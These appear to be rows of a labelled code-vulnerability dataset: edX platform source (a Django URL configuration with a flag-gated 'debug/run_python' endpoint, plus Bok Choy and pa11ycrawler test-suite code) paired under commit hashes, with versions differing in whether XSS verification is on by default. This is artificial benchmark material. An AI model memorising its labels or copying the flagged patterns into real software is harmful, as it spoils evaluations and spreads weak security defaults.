if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=""foldit_ops""),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name=""hint_manager""),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'
/n/n/n",1
48,1162dbc18fda91b07a5942873387d60fd67b2cfc,"pavelib/paver_tests/test_paver_bok_choy_cmds.py/n/n""""""
Tests for the bok-choy paver commands themselves.
Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py
""""""
import os
import unittest

from mock import patch, call
from test.test_support import EnvironmentVarGuard
from paver.easy import BuildFailure
from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler

REPO_DIR = os.getcwd()


class TestPaverBokChoyCmd(unittest.TestCase):
    """"""
    Paver Bok Choy Command test cases
    """"""

    def _expected_command(self, name, store=None, verify_xss=True):
        """"""
        Returns the command that is expected to be run for the given test spec
        and store.
        """"""

        expected_statement = (
            ""DEFAULT_STORE={default_store} ""
            ""SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' ""
            ""BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' ""
            ""BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' ""
            ""SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' ""
            ""VERIFY_XSS='{verify_xss}' ""
            ""nosetests {repo_dir}/common/test/acceptance/{exp_text} ""
            ""--with-xunit ""
            ""--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml ""
            ""--verbosity=2 ""
        ).format(
            default_store=store,
            repo_dir=REPO_DIR,
            shard_str='/shard_' + self.shard if self.shard else '',
            exp_text=name,
            a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js',
            verify_xss=verify_xss
        )
        return expected_statement

    def setUp(self):
        super(TestPaverBokChoyCmd, self).setUp()
        self.shard = os.environ.get('SHARD')
        self.env_var_override = EnvironmentVarGuard()

    def test_default(self):
        suite = BokChoyTestSuite('')
        name = 'tests'
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_suite_spec(self):
        spec = 'test_foo.py'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_class_spec(self):
        spec = 'test_foo.py:FooTest'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_testcase_spec(self):
        spec = 'test_foo.py:FooTest.test_bar'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_spec_with_draft_default_store(self):
        spec = 'test_foo.py'
        suite = BokChoyTestSuite('', test_spec=spec, default_store='draft')
        name = 'tests/{}'.format(spec)
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=name, store='draft')
        )

    def test_invalid_default_store(self):
        # the cmd will dumbly compose whatever we pass in for the default_store
        suite = BokChoyTestSuite('', default_store='invalid')
        name = 'tests'
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=name, store='invalid')
        )

    def test_serversonly(self):
        suite = BokChoyTestSuite('', serversonly=True)
        self.assertEqual(suite.cmd, """")

    def test_verify_xss(self):
        suite = BokChoyTestSuite('', verify_xss=True)
        name = 'tests'
        self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))

    def test_verify_xss_env_var(self):
        self.env_var_override.set('VERIFY_XSS', 'False')
        with self.env_var_override:
            suite = BokChoyTestSuite('')
            name = 'tests'
            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))

    def test_test_dir(self):
        test_dir = 'foo'
        suite = BokChoyTestSuite('', test_dir=test_dir)
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=test_dir)
        )

    def test_verbosity_settings_1_process(self):
        """"""
        Using 1 process means paver should ask for the traditional xunit plugin for plugin results
        """"""
        expected_verbosity_string = (
            ""--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2"".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else ''
            )
        )
        suite = BokChoyTestSuite('', num_processes=1)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_verbosity_settings_2_processes(self):
        """"""
        Using multiple processes means specific xunit, coloring, and process-related settings should
        be used.
        """"""
        process_count = 2
        expected_verbosity_string = (
            ""--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml""
            "" --processes={procs} --no-color --process-timeout=1200"".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else '',
                procs=process_count
            )
        )
        suite = BokChoyTestSuite('', num_processes=process_count)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_verbosity_settings_3_processes(self):
        """"""
        With the above test, validate that num_processes can be set to various values
        """"""
        process_count = 3
        expected_verbosity_string = (
            ""--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml""
            "" --processes={procs} --no-color --process-timeout=1200"".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else '',
                procs=process_count
            )
        )
        suite = BokChoyTestSuite('', num_processes=process_count)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_invalid_verbosity_and_processes(self):
        """"""
        If an invalid combination of verbosity and number of processors is passed in, a
        BuildFailure should be raised
        """"""
        suite = BokChoyTestSuite('', num_processes=2, verbosity=3)
        with self.assertRaises(BuildFailure):
            BokChoyTestSuite.verbosity_processes_string(suite)


class TestPaverPa11yCrawlerCmd(unittest.TestCase):

    """"""
    Paver pa11ycrawler command test cases.  Most of the functionality is
    inherited from BokChoyTestSuite, so those tests aren't duplicated.
    """"""

    def setUp(self):
        super(TestPaverPa11yCrawlerCmd, self).setUp()

        # Mock shell commands
        mock_sh = patch('pavelib.utils.test.suites.bokchoy_suite.sh')
        self._mock_sh = mock_sh.start()

        # Cleanup mocks
        self.addCleanup(mock_sh.stop)

    def _expected_command(self, report_dir, start_urls):
        """"""
        Returns the expected command to run pa11ycrawler.
        """"""
        expected_statement = (
            'pa11ycrawler run {start_urls} '
            '--pa11ycrawler-allowed-domains=localhost '
            '--pa11ycrawler-reports-dir={report_dir} '
            '--pa11ycrawler-deny-url-matcher=logout '
            '--pa11y-reporter=""1.0-json"" '
            '--depth-limit=6 '
        ).format(
            start_urls=' '.join(start_urls),
            report_dir=report_dir,
        )
        return expected_statement

    def test_default(self):
        suite = Pa11yCrawler('')
        self.assertEqual(
            suite.cmd,
            self._expected_command(suite.pa11y_report_dir, suite.start_urls)
        )

    def test_get_test_course(self):
        suite = Pa11yCrawler('')
        suite.get_test_course()
        self._mock_sh.assert_has_calls([
            call(
                'wget {targz} -O {dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)),
            call(
                'tar zxf {dir}demo_course.tar.gz -C {dir}'.format(dir=suite.imports_dir)),
        ])

    def test_generate_html_reports(self):
        suite = Pa11yCrawler('')
        suite.generate_html_reports()
        self._mock_sh.assert_has_calls([
            call(
                'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)),
        ])
/n/n/npavelib/utils/test/suites/bokchoy_suite.py/n/n""""""
Class used for defining and running Bok Choy acceptance test suite
""""""
from time import sleep
from urllib import urlencode

from common.test.acceptance.fixtures.course import CourseFixture, FixtureError

from path import Path as path
from paver.easy import sh, BuildFailure
from pavelib.utils.test.suites.suite import TestSuite
from pavelib.utils.envs import Env
from pavelib.utils.test import bokchoy_utils
from pavelib.utils.test import utils as test_utils

import os

try:
    from pygments.console import colorize
except ImportError:
    colorize = lambda color, text: text

__test__ = False  # do not collect

DEFAULT_NUM_PROCESSES = 1
DEFAULT_VERBOSITY = 2


class BokChoyTestSuite(TestSuite):
    """"""
    TestSuite for running Bok Choy tests
    Properties (below is a subset):
      test_dir - parent directory for tests
      log_dir - directory for test output
      report_dir - directory for reports (e.g., coverage) related to test execution
      xunit_report - directory for xunit-style output (xml)
      fasttest - when set, skip various set-up tasks (e.g., collectstatic)
      serversonly - prepare and run the necessary servers, only stopping when interrupted with Ctrl-C
      testsonly - assume servers are running (as per above) and run tests with no setup or cleaning of environment
      test_spec - when set, specifies test files, classes, cases, etc. See platform doc.
      default_store - modulestore to use when running tests (split or draft)
      num_processes - number of processes or threads to use in tests. Recommendation is that this
      is less than or equal to the number of available processors.
      verify_xss - when set, check for XSS vulnerabilities in the page HTML.
      See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html
    """"""
    def __init__(self, *args, **kwargs):
        super(BokChoyTestSuite, self).__init__(*args, **kwargs)
        self.test_dir = Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests')
        self.log_dir = Env.BOK_CHOY_LOG_DIR
        self.report_dir = kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR)
        self.xunit_report = self.report_dir / ""xunit.xml""
        self.cache = Env.BOK_CHOY_CACHE
        self.fasttest = kwargs.get('fasttest', False)
        self.serversonly = kwargs.get('serversonly', False)
        self.testsonly = kwargs.get('testsonly', False)
        self.test_spec = kwargs.get('test_spec', None)
        self.default_store = kwargs.get('default_store', None)
        self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)
        self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)
        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))
        self.extra_args = kwargs.get('extra_args', '')
        self.har_dir = self.log_dir / 'hars'
        self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE
        self.imports_dir = kwargs.get('imports_dir', None)
        self.coveragerc = kwargs.get('coveragerc', None)
        self.save_screenshots = kwargs.get('save_screenshots', False)

    def __enter__(self):
        super(BokChoyTestSuite, self).__enter__()

        # Ensure that we have a directory to put logs and reports
        self.log_dir.makedirs_p()
        self.har_dir.makedirs_p()
        self.report_dir.makedirs_p()
        test_utils.clean_reports_dir()      # pylint: disable=no-value-for-parameter

        if not (self.fasttest or self.skip_clean or self.testsonly):
            test_utils.clean_test_files()

        msg = colorize('green', ""Checking for mongo, memchache, and mysql..."")
        print msg
        bokchoy_utils.check_services()

        if not self.testsonly:
            self.prepare_bokchoy_run()
        else:
            # load data in db_fixtures
            self.load_data()

        msg = colorize('green', ""Confirming servers have started..."")
        print msg
        bokchoy_utils.wait_for_test_servers()
        try:
            # Create course in order to seed forum data underneath. This is
            # a workaround for a race condition. The first time a course is created;
            # role permissions are set up for forums.
            CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install()
            print 'Forums permissions/roles data has been seeded'
        except FixtureError:
            # this means it's already been done
            pass

        if self.serversonly:
            self.run_servers_continuously()

    def __exit__(self, exc_type, exc_value, traceback):
        super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback)

        # Using testsonly will leave all fixtures in place (Note: the db will also be dirtier.)
        if self.testsonly:
            msg = colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.')
            print msg
        else:
            # Clean up data we created in the databases
            msg = colorize('green', ""Cleaning up databases..."")
            print msg
            sh(""./manage.py lms --settings bok_choy flush --traceback --noinput"")
            bokchoy_utils.clear_mongo()

    def verbosity_processes_string(self):
        """"""
        Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct
        the proper combination for use with nosetests.
        """"""
        substring = []

        if self.verbosity != DEFAULT_VERBOSITY and self.num_processes != DEFAULT_NUM_PROCESSES:
            msg = 'Cannot pass in both num_processors and verbosity. Quitting'
            raise BuildFailure(msg)

        if self.num_processes != 1:
            # Construct ""multiprocess"" nosetest substring
            substring = [
                ""--with-xunitmp --xunitmp-file={}"".format(self.xunit_report),
                ""--processes={}"".format(self.num_processes),
                ""--no-color --process-timeout=1200""
            ]

        else:
            substring = [
                ""--with-xunit"",
                ""--xunit-file={}"".format(self.xunit_report),
                ""--verbosity={}"".format(self.verbosity),
            ]

        return "" "".join(substring)

    def prepare_bokchoy_run(self):
        """"""
        Sets up and starts servers for a Bok Choy run. If --fasttest is not
        specified then static assets are collected
        """"""
        sh(""{}/scripts/reset-test-db.sh"".format(Env.REPO_ROOT))

        if not self.fasttest:
            self.generate_optimized_static_assets()

        # Clear any test data already in Mongo or MySQLand invalidate
        # the cache
        bokchoy_utils.clear_mongo()
        self.cache.flush_all()

        # load data in db_fixtures
        self.load_data()

        # load courses if self.imports_dir is set
        self.load_courses()

        # Ensure the test servers are available
        msg = colorize('green', ""Confirming servers are running..."")
        print msg
        bokchoy_utils.start_servers(self.default_store, self.coveragerc)

    def load_courses(self):
        """"""
        Loads courses from self.imports_dir.

        Note: self.imports_dir is the directory that contains the directories
        that have courses in them. For example, if the course is located in
        `test_root/courses/test-example-course/`, self.imports_dir should be
        `test_root/courses/`.
        """"""
        msg = colorize('green', ""Importing courses from {}..."".format(self.imports_dir))
        print msg

        if self.imports_dir:
            sh(
                ""DEFAULT_STORE={default_store}""
                "" ./manage.py cms --settings=bok_choy import {import_dir}"".format(
                    default_store=self.default_store,
                    import_dir=self.imports_dir
                )
            )

    def load_data(self):
        """"""
        Loads data into database from db_fixtures
        """"""
        print 'Loading data from json fixtures in db_fixtures directory'
        sh(
            ""DEFAULT_STORE={default_store}""
            "" ./manage.py lms --settings bok_choy loaddata --traceback""
            "" common/test/db_fixtures/*.json"".format(
                default_store=self.default_store,
            )
        )

    def run_servers_continuously(self):
        """"""
        Infinite loop. Servers will continue to run in the current session unless interrupted.
        """"""
        print 'Bok-choy servers running. Press Ctrl-C to exit...\n'
        print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\n'

        while True:
            try:
                sleep(10000)
            except KeyboardInterrupt:
                print ""Stopping bok-choy servers.\n""
                break

    @property
    def cmd(self):
        """"""
        This method composes the nosetests command to send to the terminal. If nosetests aren't being run,
         the command returns an empty string.
        """"""
        # Default to running all tests if no specific test is specified
        if not self.test_spec:
            test_spec = self.test_dir
        else:
            test_spec = self.test_dir / self.test_spec

        # Skip any additional commands (such as nosetests) if running in
        # servers only mode
        if self.serversonly:
            return """"

        # Construct the nosetests command, specifying where to save
        # screenshots and XUnit XML reports
        cmd = [
            ""DEFAULT_STORE={}"".format(self.default_store),
            ""SCREENSHOT_DIR='{}'"".format(self.log_dir),
            ""BOK_CHOY_HAR_DIR='{}'"".format(self.har_dir),
            ""BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'"".format(self.a11y_file),
            ""SELENIUM_DRIVER_LOG_DIR='{}'"".format(self.log_dir),
            ""VERIFY_XSS='{}'"".format(self.verify_xss),
            ""nosetests"",
            test_spec,
            ""{}"".format(self.verbosity_processes_string())
        ]
        if self.pdb:
            cmd.append(""--pdb"")
        if self.save_screenshots:
            cmd.append(""--with-save-baseline"")
        cmd.append(self.extra_args)

        cmd = ("" "").join(cmd)
        return cmd


class Pa11yCrawler(BokChoyTestSuite):
    """"""
    Sets up test environment with mega-course loaded, and runs pa11ycralwer
    against it.
    """"""

    def __init__(self, *args, **kwargs):
        super(Pa11yCrawler, self).__init__(*args, **kwargs)
        self.course_key = kwargs.get('course_key')
        if self.imports_dir:
            # If imports_dir has been specified, assume the files are
            # already there -- no need to fetch them from github. This
            # allows someome to crawl a different course. They are responsible
            # for putting it, un-archived, in the directory.
            self.should_fetch_course = False
        else:
            # Otherwise, obey `--skip-fetch` command and use the default
            # test course.  Note that the fetch will also be skipped when
            # using `--fast`.
            self.should_fetch_course = kwargs.get('should_fetch_course')
            self.imports_dir = path('test_root/courses/')

        self.pa11y_report_dir = os.path.join(self.report_dir, 'pa11ycrawler_reports')
        self.tar_gz_file = ""https://github.com/edx/demo-test-course/archive/master.tar.gz""

        self.start_urls = []
        auto_auth_params = {
            ""redirect"": 'true',
            ""staff"": 'true',
            ""course_id"": self.course_key,
        }
        cms_params = urlencode(auto_auth_params)
        self.start_urls.append(""\""http://localhost:8031/auto_auth?{}\"""".format(cms_params))

        sequence_url = ""/api/courses/v1/blocks/?{}"".format(
            urlencode({
                ""course_id"": self.course_key,
                ""depth"": ""all"",
                ""all_blocks"": ""true"",
            })
        )
        auto_auth_params.update({'redirect_to': sequence_url})
        lms_params = urlencode(auto_auth_params)
        self.start_urls.append(""\""http://localhost:8003/auto_auth?{}\"""".format(lms_params))

    def __enter__(self):
        if self.should_fetch_course:
            self.get_test_course()
        super(Pa11yCrawler, self).__enter__()

    def get_test_course(self):
        """"""
        Fetches the test course.
        """"""
        self.imports_dir.makedirs_p()
        zipped_course = self.imports_dir + 'demo_course.tar.gz'

        msg = colorize('green', ""Fetching the test course from github..."")
        print msg

        sh(
            'wget {tar_gz_file} -O {zipped_course}'.format(
                tar_gz_file=self.tar_gz_file,
                zipped_course=zipped_course,
            )
        )

        msg = colorize('green', ""Uncompressing the test course..."")
        print msg

        sh(
            'tar zxf {zipped_course} -C {courses_dir}'.format(
                zipped_course=zipped_course,
                courses_dir=self.imports_dir,
            )
        )

    def generate_html_reports(self):
        """"""
        Runs pa11ycrawler json-to-html
        """"""
        cmd_str = (
            'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}'
        ).format(report_dir=self.pa11y_report_dir)

        sh(cmd_str)

    @property
    def cmd(self):
        """"""
        Runs pa11ycrawler as staff user against the test course.
        """"""
        cmd_str = (
            'pa11ycrawler run {start_urls} '
            '--pa11ycrawler-allowed-domains={allowed_domains} '
            '--pa11ycrawler-reports-dir={report_dir} '
            '--pa11ycrawler-deny-url-matcher={dont_go_here} '
            '--pa11y-reporter=""{reporter}"" '
            '--depth-limit={depth} '
        ).format(
            start_urls=' '.join(self.start_urls),
            allowed_domains='localhost',
            report_dir=self.pa11y_report_dir,
            reporter=""1.0-json"",
            dont_go_here=""logout"",
            depth=""6"",
        )
        return cmd_str
/n/n/n",0
49,1162dbc18fda91b07a5942873387d60fd67b2cfc,"/pavelib/paver_tests/test_paver_bok_choy_cmds.py/n/n""""""
Tests for the bok-choy paver commands themselves.
Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py
""""""
import os
import unittest

from mock import patch, call
from test.test_support import EnvironmentVarGuard
from paver.easy import BuildFailure
from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler

REPO_DIR = os.getcwd()


class TestPaverBokChoyCmd(unittest.TestCase):
    """"""
    Paver Bok Choy Command test cases
    """"""

    def _expected_command(self, name, store=None, verify_xss=False):
        """"""
        Returns the command that is expected to be run for the given test spec
        and store.
        """"""

        expected_statement = (
            ""DEFAULT_STORE={default_store} ""
            ""SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' ""
            ""BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' ""
            ""BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' ""
            ""SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' ""
            ""VERIFY_XSS='{verify_xss}' ""
            ""nosetests {repo_dir}/common/test/acceptance/{exp_text} ""
            ""--with-xunit ""
            ""--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml ""
            ""--verbosity=2 ""
        ).format(
            default_store=store,
            repo_dir=REPO_DIR,
            shard_str='/shard_' + self.shard if self.shard else '',
            exp_text=name,
            a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js',
            verify_xss=verify_xss
        )
        return expected_statement

    def setUp(self):
        super(TestPaverBokChoyCmd, self).setUp()
        self.shard = os.environ.get('SHARD')
        self.env_var_override = EnvironmentVarGuard()

    def test_default(self):
        suite = BokChoyTestSuite('')
        name = 'tests'
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_suite_spec(self):
        spec = 'test_foo.py'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_class_spec(self):
        spec = 'test_foo.py:FooTest'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_testcase_spec(self):
        spec = 'test_foo.py:FooTest.test_bar'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_spec_with_draft_default_store(self):
        spec = 'test_foo.py'
        suite = BokChoyTestSuite('', test_spec=spec, default_store='draft')
        name = 'tests/{}'.format(spec)
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=name, store='draft')
        )

    def test_invalid_default_store(self):
        # the cmd will dumbly compose whatever we pass in for the default_store
        suite = BokChoyTestSuite('', default_store='invalid')
        name = 'tests'
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=name, store='invalid')
        )

    def test_serversonly(self):
        suite = BokChoyTestSuite('', serversonly=True)
        self.assertEqual(suite.cmd, """")

    def test_verify_xss(self):
        suite = BokChoyTestSuite('', verify_xss=True)
        name = 'tests'
        self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))

    def test_verify_xss_env_var(self):
        self.env_var_override.set('VERIFY_XSS', 'True')
        with self.env_var_override:
            suite = BokChoyTestSuite('')
            name = 'tests'
            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))

    def test_test_dir(self):
        test_dir = 'foo'
        suite = BokChoyTestSuite('', test_dir=test_dir)
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=test_dir)
        )

    def test_verbosity_settings_1_process(self):
        """"""
        Using 1 process means paver should ask for the traditional xunit plugin for plugin results
        """"""
        expected_verbosity_string = (
            ""--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2"".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else ''
            )
        )
        suite = BokChoyTestSuite('', num_processes=1)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_verbosity_settings_2_processes(self):
        """"""
        Using multiple processes means specific xunit, coloring, and process-related settings should
        be used.
        """"""
        process_count = 2
        expected_verbosity_string = (
            ""--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml""
            "" --processes={procs} --no-color --process-timeout=1200"".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else '',
                procs=process_count
            )
        )
        suite = BokChoyTestSuite('', num_processes=process_count)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_verbosity_settings_3_processes(self):
        """"""
        With the above test, validate that num_processes can be set to various values
        """"""
        process_count = 3
        expected_verbosity_string = (
            ""--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml""
            "" --processes={procs} --no-color --process-timeout=1200"".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else '',
                procs=process_count
            )
        )
        suite = BokChoyTestSuite('', num_processes=process_count)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_invalid_verbosity_and_processes(self):
        """"""
        If an invalid combination of verbosity and number of processors is passed in, a
        BuildFailure should be raised
        """"""
        suite = BokChoyTestSuite('', num_processes=2, verbosity=3)
        with self.assertRaises(BuildFailure):
            BokChoyTestSuite.verbosity_processes_string(suite)


class TestPaverPa11yCrawlerCmd(unittest.TestCase):

    """"""
    Paver pa11ycrawler command test cases.  Most of the functionality is
    inherited from BokChoyTestSuite, so those tests aren't duplicated.
    """"""

    def setUp(self):
        super(TestPaverPa11yCrawlerCmd, self).setUp()

        # Mock shell commands
        mock_sh = patch('pavelib.utils.test.suites.bokchoy_suite.sh')
        self._mock_sh = mock_sh.start()

        # Cleanup mocks
        self.addCleanup(mock_sh.stop)

    def _expected_command(self, report_dir, start_urls):
        """"""
        Returns the expected command to run pa11ycrawler.
        """"""
        expected_statement = (
            'pa11ycrawler run {start_urls} '
            '--pa11ycrawler-allowed-domains=localhost '
            '--pa11ycrawler-reports-dir={report_dir} '
            '--pa11ycrawler-deny-url-matcher=logout '
            '--pa11y-reporter=""1.0-json"" '
            '--depth-limit=6 '
        ).format(
            start_urls=' '.join(start_urls),
            report_dir=report_dir,
        )
        return expected_statement

    def test_default(self):
        suite = Pa11yCrawler('')
        self.assertEqual(
            suite.cmd,
            self._expected_command(suite.pa11y_report_dir, suite.start_urls)
        )

    def test_get_test_course(self):
        suite = Pa11yCrawler('')
        suite.get_test_course()
        self._mock_sh.assert_has_calls([
            call(
                'wget {targz} -O {dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)),
            call(
                'tar zxf {dir}demo_course.tar.gz -C {dir}'.format(dir=suite.imports_dir)),
        ])

    def test_generate_html_reports(self):
        suite = Pa11yCrawler('')
        suite.generate_html_reports()
        self._mock_sh.assert_has_calls([
            call(
                'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)),
        ])
/n/n/n/pavelib/utils/test/suites/bokchoy_suite.py/n/n""""""
Class used for defining and running Bok Choy acceptance test suite
""""""
from time import sleep
from urllib import urlencode

from common.test.acceptance.fixtures.course import CourseFixture, FixtureError

from path import Path as path
from paver.easy import sh, BuildFailure
from pavelib.utils.test.suites.suite import TestSuite
from pavelib.utils.envs import Env
from pavelib.utils.test import bokchoy_utils
from pavelib.utils.test import utils as test_utils

import os

try:
    from pygments.console import colorize
except ImportError:
    colorize = lambda color, text: text

__test__ = False  # do not collect

DEFAULT_NUM_PROCESSES = 1
DEFAULT_VERBOSITY = 2


class BokChoyTestSuite(TestSuite):
    """"""
    TestSuite for running Bok Choy tests
    Properties (below is a subset):
      test_dir - parent directory for tests
      log_dir - directory for test output
      report_dir - directory for reports (e.g., coverage) related to test execution
      xunit_report - directory for xunit-style output (xml)
      fasttest - when set, skip various set-up tasks (e.g., collectstatic)
